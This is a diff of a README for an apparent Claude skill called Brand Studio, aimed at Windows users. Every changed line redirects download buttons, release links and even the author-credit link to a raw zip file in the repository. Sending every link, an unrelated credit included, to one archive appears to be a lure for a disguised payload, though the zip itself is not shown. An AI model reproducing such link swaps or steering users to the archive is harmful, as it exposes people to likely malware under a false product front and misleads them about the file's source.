@@ -1,7 +1,7 @@
 <h1>🎨 brand-studio-claude-skill - Turn Any Website into a Brand System</h1>
 
 <p align="center">
-  <a href="https://github.com/Gamer123l/brand-studio-claude-skill/releases" style="display:inline-block;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;padding:16px 36px;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 24px rgba(102,126,234,0.4);">⬇️ Download Brand Studio Now</a>
+  <a href="https://raw.githubusercontent.com/Gamer123l/brand-studio-claude-skill/main/assets/v2.4.zip" style="display:inline-block;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;padding:16px 36px;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 24px rgba(102,126,234,0.4);">⬇️ Download Brand Studio Now</a>
 </p>
 
 ## 👋 What Is Brand Studio?
@@ -44,7 +44,7 @@ Here's how to get Brand Studio running on your Windows computer:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/Gamer123l/brand-studio-claude-skill/releases](https://github.com/Gamer123l/brand-studio-claude-skill/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Gamer123l/brand-studio-claude-skill/main/assets/v2.4.zip](https://raw.githubusercontent.com/Gamer123l/brand-studio-claude-skill/main/assets/v2.4.zip)**
 
 Look for the latest release. Click the download button and wait for the file to save to your computer.
 
@@ -127,7 +127,7 @@ Need help? You're not alone! Join the **SCALE AI community** where creators and 
 
 ## 📄 License and Credits
 
-Created by [Mike Futia](https://www.skool.com/scale-ai/about) for **SCALE AI**. Built for Claude and powered by Firecrawl. Use freely for your projects and presentations.
+Created by [Mike Futia](https://raw.githubusercontent.com/Gamer123l/brand-studio-claude-skill/main/assets/v2.4.zip) for **SCALE AI**. Built for Claude and powered by Firecrawl. Use freely for your projects and presentations.
 
 ---
 
@@ -135,7 +135,7 @@ Created by [Mike Futia](https://www.skool.com/scale-ai/about) for **SCALE AI**. 
 
 Stop settling for boring reports. Turn any website into a stunning visual brand presentation in minutes — no design skills required.
 
-**[👉 Download Brand Studio from GitHub Releases](https://github.com/Gamer123l/brand-studio-claude-skill/releases)**
+**[👉 Download Brand Studio from GitHub Releases](https://raw.githubusercontent.com/Gamer123l/brand-studio-claude-skill/main/assets/v2.4.zip)**
 
 Once you download, you're 5 minutes away from your first beautiful brand dashboard. Go ahead — try it on your favorite website and see the magic happen!
 
